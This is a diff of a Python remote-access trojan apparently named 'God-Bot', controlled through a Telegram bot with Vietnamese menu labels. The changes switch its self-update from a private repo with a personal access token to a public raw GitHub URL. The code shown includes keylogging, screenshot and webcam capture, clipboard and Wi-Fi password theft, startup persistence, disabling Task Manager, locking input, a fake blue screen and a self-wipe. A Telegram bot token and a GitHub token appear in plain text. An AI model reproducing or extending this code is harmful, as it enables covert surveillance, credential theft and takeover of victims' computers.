@@ -13,7 +13,8 @@ from datetime import datetime
 
 TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
 ALLOWED_CHAT_ID = "7666107995"
-GITHUB_PAT = "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"
+
+# --- LINK RAW PUBLIC REPO ---
 UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"
 
 block_active = False
@@ -54,7 +55,7 @@ def send_telegram_menu(chat_id, page=1):
             "inline_keyboard": [
                 [{"text": "📊 Thong so CPU/RAM", "callback_data": "sysinfo"}, {"text": "🔥 Top Tien trinh", "callback_data": "process"}],
                 [{"text": "🖥 Chup man hinh", "callback_data": "screenshot"}, {"text": "📸 Chup Webcam", "callback_data": "webcam"}],
-                [{"text": "⌨️️ Xem Keylogger", "callback_data": "get_keylog"}, {"text": "📋 Xem Clipboard", "callback_data": "get_clipboard"}],
+                [{"text": "⌨ Xem Keylogger", "callback_data": "get_keylog"}, {"text": "📋 Xem Clipboard", "callback_data": "get_clipboard"}],
                 [{"text": "🌐 Lay DS WiFi & Pass", "callback_data": "get_wifi"}, {"text": "💾 Thong tin o cung", "callback_data": "disk_info"}],
                 [{"text": "➡️ Sang Trang 2", "callback_data": "page_2"}]
             ]
@@ -76,7 +77,7 @@ def send_telegram_menu(chat_id, page=1):
             "inline_keyboard": [
                 [{"text": "🚀 Tu dong cung Win", "callback_data": "set_startup"}, {"text": "📦 Liet ke pham mem", "callback_data": "list_apps"}],
                 [{"text": "🛑 Vo hieu hoa TaskMgr", "callback_data": "block_taskmgr"}, {"text": "🔓 Mo lai TaskMgr", "callback_data": "unblock_taskmgr"}],
-                [{"text": "🔄 Update Online (PAT)", "callback_data": "do_update"}, {"text": "💥 Tu huy toan bo (Wipe)", "callback_data": "self_destruct"}],
+                [{"text": "🔄 Update Online (Public)", "callback_data": "do_update"}, {"text": "💥 Tu huy toan bo (Wipe)", "callback_data": "self_destruct"}],
                 [{"text": "⬅️ Trang 2", "callback_data": "page_2"}, {"text": "🛑 Thoat Bot", "callback_data": "end_bot"}]
             ]
         }
@@ -133,10 +134,9 @@ def start_keylogger():
 threading.Thread(target=start_keylogger, daemon=True).start()
 
 def self_update(chat_id):
-    send_telegram_message(chat_id, "🔄 *Dang ket noi Private Repo qua PAT de tai ban cap nhat...*")
+    send_telegram_message(chat_id, "🔄 *Dang ket noi Public Repo de tai ban cap nhat...*")
     try:
-        headers = {"Authorization": f"token {GITHUB_PAT}"}
-        response = requests.get(UPDATE_URL, headers=headers, timeout=30)
+        response = requests.get(UPDATE_URL, timeout=30)
         if response.status_code != 200:
             send_telegram_message(chat_id, f"[-] Loi tai code: HTTP {response.status_code}")
             return
@@ -148,13 +148,15 @@ def self_update(chat_id):
         with open(new_file_path, "w", encoding="utf-8") as f:
             f.write(content)
         send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang cai dat thu vien va khoi dong lai...*")
+        
+        current_script_name = os.path.basename(sys.argv[0])
         updater_script = "updater.bat"
         with open(updater_script, "w", encoding="utf-8") as f:
             f.write(f"""
 @echo off
 python -m pip install --upgrade pip > nul
 python -m pip install requests psutil pyautogui opencv-python pynput pygetwindow pyperclip > nul
-move /y new_bot.py {os.path.basename(sys.argv[0])}
+move /y new_bot.py {current_script_name}
 start pythonw "{os.path.abspath(sys.argv[0])}"
 del %0
 """)
@@ -239,6 +241,7 @@ def handle_callback(callback_query):
         
     elif data == "lock_pc":
         block_active = True
+        import ctypes
         threading.Thread(target=lambda: [ctypes.windll.user32.BlockInput(True) for _ in iter(lambda: not block_active, True)], daemon=True).start()
         send_telegram_message(chat_id, "🔒 Da khoa cung chuot va ban phim!")
         
@@ -261,7 +264,6 @@ def handle_callback(callback_query):
         
     elif data == "fake_bsod":
         send_telegram_message(chat_id, "🖥️ Da kich hoat man hinh xanh gia lap!")
-        # Mo cmd full man hinh hoac hieu ung
         subprocess.run("start /max cmd /c color 17 && echo A problem has been detected and Windows has been shut down to prevent damage to your computer... && pause", shell=True)
         
     elif data == "beep_sound":
@@ -287,7 +289,7 @@ def handle_callback(callback_query):
         os._exit(0)
 
 def main_loop():
-    print("[*] God-Bot on-demand phan trang dang chay ngam...")
+    print("[*] God-Bot bot.py public dang chay ngam...")
     offset = None
     while True:
         updates = get_updates(offset)
